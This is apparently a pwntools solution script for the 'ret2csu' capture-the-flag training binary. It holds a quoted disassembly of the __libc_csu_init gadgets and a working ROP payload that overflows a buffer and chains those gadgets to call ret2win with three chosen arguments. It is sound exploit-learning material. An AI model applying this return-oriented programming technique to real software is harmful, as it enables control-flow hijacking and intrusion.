from pwn import *

context.binary = elf = ELF('./ret2csu')

p = elf.process()

'''
      ┌──> 0x00400680      4c89fa         mov rdx, r15                ; char **ubp_av
      ╎│   0x00400683      4c89f6         mov rsi, r14                ; int argc
      ╎│   0x00400686      4489ef         mov edi, r13d               ; func main
      ╎│   0x00400689      41ff14dc       call qword [r12 + rbx*8]
      ╎│   0x0040068d      4883c301       add rbx, 1
      ╎│   0x00400691      4839dd         cmp rbp, rbx
      └──< 0x00400694      75ea           jne 0x400680
       │   ; CODE XREF from sym.__libc_csu_init @ 0x400674
       └─> 0x00400696      4883c408       add rsp, 8
           0x0040069a      5b             pop rbx
           0x0040069b      5d             pop rbp
           0x0040069c      415c           pop r12
           0x0040069e      415d           pop r13
           0x004006a0      415e           pop r14
           0x004006a2      415f           pop r15
           0x004006a4      c3             ret

  0x004006a3                 5f  pop rdi
  0x004006a4                 c3  ret


'''
#gdb.attach(p)

offset = 40 
# 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d
a = 0xdeadbeefdeadbeef
b = 0xcafebabecafebabe
c = 0xd00df00dd00df00d

fini = 0x600df8  #  fini array to do nothing
pop_csu = 0x0040069a # pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret;
ret_csu = 0x00400680
pop_rdi = 0x004006a3

payload  = b'A'*offset
payload += p64(pop_csu)+p64(0)+p64(1)+p64(fini)+p64(a)+p64(b)+p64(c)
payload += p64(ret_csu)
payload += p64(0)*7
payload += p64(pop_rdi)+p64(a)
payload += p64(elf.sym.ret2win)

p.recvuntil("> ")
p.sendline(payload)
print(p.readall()[-33:-1])
